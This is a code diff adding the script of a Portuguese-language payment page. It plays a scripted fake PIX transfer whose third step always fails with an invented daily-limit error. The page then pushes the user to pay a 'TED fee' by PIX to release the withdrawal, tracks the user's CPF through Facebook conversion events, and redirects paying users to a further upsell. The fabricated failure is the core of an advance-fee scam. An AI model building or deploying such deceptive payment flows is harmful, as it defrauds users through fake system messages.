+      if (typeof fbq !== 'undefined')
+        fbq('track', 'Purchase', { value: HP_AMOUNT, currency: 'BRL', content_ids: ['taxa-ted'], content_type: 'product' }, { eventID: eventId });
+
+      // Server-side CAPI — fire and forget com keepalive
+      fetch('/api/fb-event', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event_name: 'Purchase', value: HP_AMOUNT, currency: 'BRL',
+          cpf: userCPF, client_user_agent: navigator.userAgent,
+          event_source_url: window.location.href,
+          fbc: document.cookie.match(/_fbc=([^;]+)/)?.[1] || '',
+          fbp: document.cookie.match(/_fbp=([^;]+)/)?.[1] || '',
+          external_id: externalId, event_id: eventId
+        }),
+        keepalive: true
+      }).catch(() => {});
+    }
+
+    function startPolling() {
+      pollingInterval = setInterval(async () => {
+        try {
+          const d = await checkPaymentStatus(externalId);
+          if (d && isPaidStatus(d.status)) { onUpsellPaid(); return; }
+          if (await checkWebhookStatus(externalId)) { onUpsellPaid(); return; }
+        } catch(e) {
+          if (await checkWebhookStatus(externalId)) { onUpsellPaid(); return; }
+        }
+      }, 3000);
+    }
+
+    // ─── VISIBILITYCHANGE ─────────────────────────────────────────────────────
+    document.addEventListener('visibilitychange', async () => {
+      if (document.visibilityState === 'visible' && externalId) {
+        if (await checkWebhookStatus(externalId)) { onUpsellPaid(); return; }
+        try {
+          const d = await checkPaymentStatus(externalId);
+          if (d && isPaidStatus(d.status)) { onUpsellPaid(); return; }
+        } catch(e) {}
+      }
+    });
+
+    // ─── COPIAR PIX ──────────────────────────────────────────────────────────
+    function copyPix() {
+      const code = document.getElementById('pix-code-upsell').textContent;
+      if (!code || code === '—') return;
+      const doFeedback = () => {
+        ['btn-copy-upsell','btn-copy-fixed'].forEach(id => {
+          const btn = document.getElementById(id);
+          if (!btn) return;
+          btn.classList.add('copied');
+          btn.innerHTML = '<i class="fas fa-check"></i> Copiado! Abra seu banco agora';
+          setTimeout(() => {
+            btn.classList.remove('copied');
+            btn.innerHTML = id === 'btn-copy-fixed'
+              ? '<i class="fas fa-copy"></i> Copiar PIX e Liberar Saque'
+              : '<i class="fas fa-copy"></i> Copiar Código PIX';
+          }, 4000);
+        });
+        document.getElementById('aviso-retorno-upsell').style.display = 'block';
+      };
+      navigator.clipboard.writeText(code).then(doFeedback).catch(() => {
+        const t = document.createElement('textarea');
+        t.value = code; document.body.appendChild(t); t.select();
+        document.execCommand('copy'); document.body.removeChild(t);
+        doFeedback();
+      });
+    }
+
+    // ─── GERAR PIX ───────────────────────────────────────────────────────────
+    async function gerarPix() {
+      const btn = document.getElementById('btn-gerar');
+      if (btn.disabled || btn.classList.contains('loading')) return;
+      btn.classList.remove('active'); btn.classList.add('loading');
+      document.getElementById('btn-icon').className = 'fas fa-spinner fa-spin';
+      document.getElementById('btn-text').textContent = 'Processando...';
+      btn.disabled = true;
+
+      try {
+        const order   = await createOrder();
+        externalId    = order.publicId || order.txId;
+
+        const qrSrc = order.qrCodeUrl
+          || (order.qrCodeBase64 ? `data:image/png;base64,${order.qrCodeBase64}` : '');
+        document.getElementById('qr-upsell').src = qrSrc;
+        document.getElementById('pix-code-upsell').textContent = order.qrCodeText || order.copy_past || '';
+        document.getElementById('pix-section').style.display = 'block';
+        document.getElementById('btn-copy-fixed').classList.add('visible');
+
+        setTimeout(() => {
+          document.getElementById('pix-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+        }, 200);
+
+        // InitiateCheckout
+        const icId = `ic-ted-${externalId}-${Date.now()}`;
+        if (typeof fbq !== 'undefined')
+          fbq('track', 'InitiateCheckout', { value: HP_AMOUNT, currency: 'BRL', content_ids: ['taxa-ted'], content_type: 'product' }, { eventID: icId });
+        fbServerEvent('InitiateCheckout', HP_AMOUNT, icId);
+
+        btn.style.display = 'none';
+        document.getElementById('form-hint').style.display = 'none';
+
+        startTimer();
+        startPolling();
+
+      } catch(err) {
+        btn.classList.remove('loading'); btn.classList.add('active'); btn.disabled = false;
+        document.getElementById('btn-icon').className = 'fas fa-bolt';
+        document.getElementById('btn-text').textContent = 'Erro — Tentar novamente';
+        console.error(err);
+      }
+    }
+
+    // ─── ANIMAÇÃO DE ENVIO ────────────────────────────────────────────────────
+    function runSendingAnimation() {
+      const bar = document.getElementById('progress-bar');
+      const steps = [
+        { id: 'step1', delay: 300,  progress: 25,  doneText: 'Chave PIX verificada ✓' },
+        { id: 'step2', delay: 1200, progress: 55,  doneText: 'Transferência autorizada ✓' },
+        { id: 'step3', delay: 2400, progress: 80,  doneText: null, error: true, errorText: 'Limite diário excedido ✗' },
+      ];
+
+      // Mostra steps um a um
+      steps.forEach((s, i) => {
+        // Aparece
+        setTimeout(() => {
+          document.getElementById(s.id).classList.add('visible');
+          bar.style.width = s.progress + '%';
+        }, s.delay);
+
+        // Resolve (done ou error)
+        setTimeout(() => {
+          const step = document.getElementById(s.id);
+          const icon = document.getElementById(s.id + '-icon');
+          const text = document.getElementById(s.id + '-text');
+
+          if (s.error) {
+            step.classList.add('error');
+            icon.className = 'step-icon error';
+            icon.innerHTML = '<i class="fas fa-times"></i>';
+            text.className = 'step-text error';
+            text.textContent = s.errorText;
+
+            // Atualiza título para erro
+            setTimeout(() => {
+              document.getElementById('sending-title').textContent = '⚠️ Transferência Bloqueada';
+              document.getElementById('sending-sub').textContent = 'Valor acima do limite diário PIX.\nAção necessária para liberar.';
+              document.getElementById('sending-icon').className = 'fas fa-ban';
+              document.getElementById('sending-screen').querySelector('.sending-circle').style.background = 'linear-gradient(135deg, #fef2f2, #fee2e2)';
+              document.getElementById('sending-screen').querySelector('.sending-circle').style.borderColor = 'var(--red)';
+              document.getElementById('sending-screen').querySelector('.sending-circle').style.animation = 'none';
+              bar.style.width = '80%';
+              bar.style.background = 'var(--red)';
+            }, 400);
+
+            // Fecha a tela e revela o upsell
+            setTimeout(() => {
+              document.getElementById('sending-screen').classList.add('hide');
+              setTimeout(() => {
+                document.getElementById('sending-screen').style.display = 'none';
+              }, 500);
+            }, 1800);
+
+          } else {
+            step.classList.add('done');
+            icon.className = 'step-icon done';
+            icon.innerHTML = '<i class="fas fa-check"></i>';
+            text.className = 'step-text done';
+            text.textContent = s.doneText;
+          }
+        }, s.delay + (s.error ? 600 : 500));
+      });
+    }
+
+    // ─── INIT ────────────────────────────────────────────────────────────────
+    window.addEventListener('load', () => {
+      if (localStorage.getItem('hp_upsell_paid_' + userCPF.replace(/\D/g,''))) {
+        window.location.href = 'upsell2/' + window.location.search;
+        return;
+      }
+      checkForm();
+      runSendingAnimation();
+    });
+  </script>
+
+</body>
+</html>
